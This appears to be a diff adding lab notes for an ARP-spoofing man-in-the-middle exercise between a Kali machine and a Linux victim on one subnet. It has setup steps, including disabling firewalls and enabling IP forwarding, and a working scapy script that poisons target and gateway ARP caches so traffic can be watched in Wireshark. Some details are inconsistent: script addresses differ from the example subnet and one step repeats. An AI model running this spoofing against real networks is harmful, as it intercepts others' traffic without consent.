@@ -1,0 +1,34 @@
+1.first os(attacker ) kali 
+   second os(victim) any linux(mine parrot)
+2.set the network adapter as bridged for each os in the network settings
+3.disable the firewall in both os then use the command in kali to enable forwarding of the traffic echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+4.both the os network must be in the same subnet 
+for example Kali ip: 192.168.165.56
+ubuntu ip:192.168.165.27
+in both ip 192.168.165.xx is common so it is in the same subnet
+5.note the gateway of the os
+6. in kali linux create a python code 
+arpspoofing.py
+from scapy.all import *
+import sys
+
+def spoof(target_ip, spoof_ip):
+    target_mac = getmacbyip(target_ip)
+    if target_mac is None:
+        print(f"MAC for {target_ip} not found.")
+        return
+    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    send(packet, verbose=False)
+    print(f"Sent spoofed ARP to {target_ip} saying I am {spoof_ip}")
+
+target = "192.168.1.101"   
+gateway = "192.168.1.1"    
+
+while True:
+    spoof(target, gateway)
+    spoof(gateway, target)
+    time.sleep(2)
+7.Run the python code in kali
+8.open wireshark in kali and apply the filter ip.addr = <victim os ip i.e ubuntu's ip>
+8.open wireshark in kali and apply the filter ip.addr = <victim os ip i.e ubuntu's ip>
+9.In ubuntu perform any browsing or ping activities those traffics can be seen in the kali wireshark environment
